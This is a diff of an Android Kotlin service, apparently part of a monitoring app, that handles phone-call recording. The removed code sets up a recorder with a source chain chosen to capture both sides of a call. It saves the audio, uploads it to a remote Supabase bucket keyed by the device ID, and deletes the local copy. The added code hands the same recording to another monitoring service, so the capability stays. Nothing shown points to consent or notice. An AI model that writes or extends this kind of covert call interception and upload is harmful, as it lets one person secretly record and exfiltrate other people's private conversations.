@@ -62,8 +62,6 @@ class CallMonitoringService : Service() {
     }
 
     // ── State ──────────────────────────────────────────────────────────────────
-    private var recorder: MediaRecorder? = null
-    private var currentFile: File? = null
     @Volatile private var isRecording = false
 
     private lateinit var telephonyManager: TelephonyManager
@@ -186,137 +184,27 @@ class CallMonitoringService : Service() {
             Log.w(TAG, "Already recording — ignoring OFFHOOK")
             return
         }
-        try {
-            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
-            val file = File(cacheDir, "call_$ts.m4a")
-            currentFile = file
-
-            recorder = buildRecorder(file)
-            recorder!!.prepare()
-            recorder!!.start()
-            isRecording = true
-            Log.i(TAG, "🎙️ Recording started → ${file.name}")
-        } catch (e: Exception) {
-            Log.e(TAG, "startRecording failed: ${e.message}")
-            // logRemote is suspend — must run in coroutine
-            scope.launch {
-                SupabaseManager.getInstance()
-                    .logRemote(this@CallMonitoringService, TAG, "ERROR",
-                        "Call record start failed: ${e.message}")
+        val service = MonitoringForegroundService.getInstance()
+        if (service != null) {
+            val started = service.startCallRecording()
+            if (started) {
+                isRecording = true
+                Log.i(TAG, "Call recording delegated to MonitoringForegroundService")
+            } else {
+                Log.e(TAG, "Failed to start call recording via MonitoringForegroundService")
             }
-            safeReleaseRecorder()
+        } else {
+            Log.e(TAG, "MonitoringForegroundService instance is null")
         }
     }
 
     private fun stopAndUpload() {
-        val file = currentFile
-        try {
-            recorder?.stop()
-        } catch (e: Exception) {
-            Log.w(TAG, "stop() threw: ${e.message}")
+        if (!isRecording) return
+        val service = MonitoringForegroundService.getInstance()
+        if (service != null) {
+            service.stopCallRecording()
+            Log.i(TAG, "Call recording stop delegated to MonitoringForegroundService")
         }
-        safeReleaseRecorder()
         isRecording = false
-
-        if (file != null && file.exists() && file.length() > 2_048) {
-            Log.i(TAG, "⬆️ Uploading call recording: ${file.name} (${file.length() / 1024} KB)")
-            scope.launch { uploadFile(file) }
-        } else {
-            Log.d(TAG, "Recording too small or missing — discarded")
-            file?.delete()
-        }
-    }
-
-    private fun safeReleaseRecorder() {
-        try { recorder?.release() } catch (_: Exception) {}
-        recorder = null
-    }
-
-    // ── MediaRecorder factory ─────────────────────────────────────────────────
-
-    /**
-     * Build a MediaRecorder configured for call audio.
-     *
-     * Source priority (FIXED ORDER):
-     *   1. VOICE_COMMUNICATION – MUST be first: captures BOTH earpiece audio AND mic.
-     *                            Without this, only the device mic is captured and the
-     *                            remote party's voice is completely missing in recordings.
-     *   2. VOICE_CALL          – Direct call audio path (API 29+), captures both sides.
-     *   3. VOICE_RECOGNITION   – Ambient + mic fallback, no echo cancellation.
-     *   4. MIC                 – Last resort: only captures device mic (misses earpiece).
-     */
-    private fun buildRecorder(outputFile: File): MediaRecorder {
-        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-            MediaRecorder(this)
-        else
-            @Suppress("DEPRECATION") MediaRecorder()
-
-        // IMPORTANT: VOICE_COMMUNICATION MUST come before MIC.
-        // MIC only records the microphone; it cannot capture the earpiece (remote party).
-        // VOICE_COMMUNICATION captures the full call audio stream including both parties.
-        val sourceChain = buildList {
-            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // ← Both sides of call
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                add(MediaRecorder.AudioSource.VOICE_CALL)       // Direct call path API 29+
-            }
-            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)   // Ambient fallback
-            add(MediaRecorder.AudioSource.MIC)                  // Last resort (mic only)
-        }
-        var chosenSource = MediaRecorder.AudioSource.VOICE_COMMUNICATION
-        for (src in sourceChain) {
-            try {
-                rec.setAudioSource(src)
-                chosenSource = src
-                Log.i(TAG, "✅ Call audio source selected: $src")
-                break
-            } catch (e: Exception) {
-                Log.w(TAG, "Audio source $src unavailable: ${e.message}")
-            }
-        }
-        Log.d(TAG, "Call audio source final: $chosenSource")
-
-        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        rec.setAudioSamplingRate(44_100)      // 44.1 kHz — full voice quality
-        rec.setAudioEncodingBitRate(128_000)  // 128 kbps — clear call audio
-        rec.setOutputFile(outputFile.absolutePath)
-        return rec
-    }
-
-    // ── Upload ────────────────────────────────────────────────────────────────
-
-    private suspend fun uploadFile(file: File) = withContext(Dispatchers.IO) {
-        try {
-            val deviceId = android.provider.Settings.Secure.getString(
-                contentResolver, android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "unknown"
-
-            val result = SupabaseManager.getInstance().uploadFile(
-                file           = file,
-                bucket         = BUCKET,
-                folder         = "audio/$deviceId",
-                customFileName = file.name
-            )
-
-            when (result) {
-                is UploadResult.Success -> {
-                    Log.i(TAG, "✅ Call recording uploaded: ${result.fileName}")
-                    SupabaseManager.getInstance()
-                        .logRemote(this@CallMonitoringService, TAG, "INFO",
-                            "Call audio OK: ${result.fileName} (${file.length() / 1024} KB)")
-                }
-                is UploadResult.Error -> {
-                    Log.e(TAG, "Upload failed: ${result.message}")
-                    SupabaseManager.getInstance()
-                        .logRemote(this@CallMonitoringService, TAG, "ERROR",
-                            "Call audio upload failed: ${result.message}")
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "uploadFile exception: ${e.message}")
-        } finally {
-            file.delete()
-            currentFile = null
-        }
     }
 }
